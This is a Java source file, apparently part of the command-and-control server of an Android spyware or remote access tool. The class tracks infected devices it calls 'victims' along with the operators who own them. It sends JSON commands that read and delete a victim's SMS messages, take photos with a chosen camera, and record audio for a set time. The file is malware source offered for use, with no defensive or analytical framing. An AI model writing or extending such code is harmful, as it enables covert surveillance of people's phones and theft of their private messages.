import db.DBUsers;
import io.netty.channel.ChannelFuture;
import io.netty.channel.ChannelFutureListener;
import io.netty.channel.ChannelHandlerContext;
import org.json.simple.JSONArray;
import org.json.simple.JSONObject;

import java.awt.image.DataBuffer;
import java.net.SocketAddress;
import java.util.ArrayList;

public class AVictim extends Victim {

    AVictim(ChannelHandlerContext context, String name) {
        this.context = context;
        this.name = name;
        this.owners = NettyServer.getDBManager().DBUsers.getOwnersByVictim(name);
    }

    void sendAuthVictim() {
        JSONObject query = new JSONObject();
        query.put("action", "auth.victim");
        sendMessage(query);
    }

    public void sendGetSms(String type, long count, String owner) {
        JSONObject query = new JSONObject();
        query.put("action", "get.sms");
        query.put("type", type);
        query.put("count", count);
        query.put("owner", owner);
        sendMessage(query);
    }

    public void sendDeleteSms(long id, String owner) {
        JSONObject query = new JSONObject();
        query.put("action", "delete.sms");
        query.put("id", id);
        query.put("owner", owner);
        sendMessage(query);
    }

    public void sendTakePicture(String camera, String owner) {
        JSONObject query = new JSONObject();
        query.put("action", "take.picture");
        query.put("camera", camera);
        query.put("owner", owner);
        sendMessage(query);
    }

    public void sendStartAudioRecord(long seconds, String owner) {
        JSONObject query = new JSONObject();
        query.put("action", "start.audio.record");
        query.put("seconds", seconds);
        query.put("owner", owner);
        sendMessage(query);
    }

}
